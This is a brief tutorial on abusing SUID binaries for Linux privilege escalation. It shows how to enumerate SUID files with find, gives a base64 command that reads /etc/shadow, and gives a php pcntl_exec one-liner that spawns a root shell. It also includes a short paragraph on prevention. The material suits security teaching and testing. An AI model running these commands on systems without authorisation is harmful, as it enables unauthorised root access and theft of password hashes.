A *SUID* (*Set User ID*) privilege is a special permission that can be set on a binary file on Unix/Linux systems. This permission gives the user running the file the *same privileges* as the *owner* of the file.

For example, if a binary file has the SUID permission set and is owned by the root user, any user running it will temporarily acquire the same privileges as the root user, allowing them to perform actions that they would not normally be able to do as a normal user.

SUID privilege abuse is a technique used by attackers to elevate their level of access on a compromised system. If an attacker is able to gain access to a binary file with SUID permissions, he can execute commands with special privileges and perform malicious actions on the system.

To prevent SUID privilege abuse, it is recommended to limit the number of files with SUID permissions and ensure that they are only granted to files that require this permission to function properly. In addition, it is important to regularly monitor the system for unexpected changes in file permissions and to look for possible security breaches.

# Enumeration

We can *search* for all files with *SUID* permissions on the system with the *find* command:

```bash
find / -perm -4000 2>/dev/null
```

We can also see the *owner* of those files:

```bash
find / -perm -4000 -ls 2>/dev/null
```

# Examples

## Viewing privileged files

Let's assume that the *base64* binary has the following permissions:

```bash
-rwsr-xr-x 1 root root 35328 Feb 7 2022 /usr/bin/base64
```

As we can see it has the *SUID* permission and its owner is *root*. This means that any user can execute *base64* as its owner, in this case, *root*.

Currently as a normal user we cannot read the */etc/shadow* file, but having the *base64* binary with *SUID* permission we can run the following command to read it:

```bash
base64 /etc/shadow -w 0 | base64 -d
```

## Escalating privileges

Let's assume that the *php* binary has *SUID* permissions. We could enter the following command to *escalate privileges*:

```bash
php -r "pcntl_exec('/bin/sh', ['-p']);"
```

This would launch a *shell* as *root*.

----
> Once inside the shell, if we wanted to launch a bash with privileges we should execute the *bash -p* command.
----

It is convenient to look at all the *binaries* covered by [GTFObins](https://gtfobins.github.io/) to see if there are any that have *SUIDs* and have a potential way to *elevate privileges*.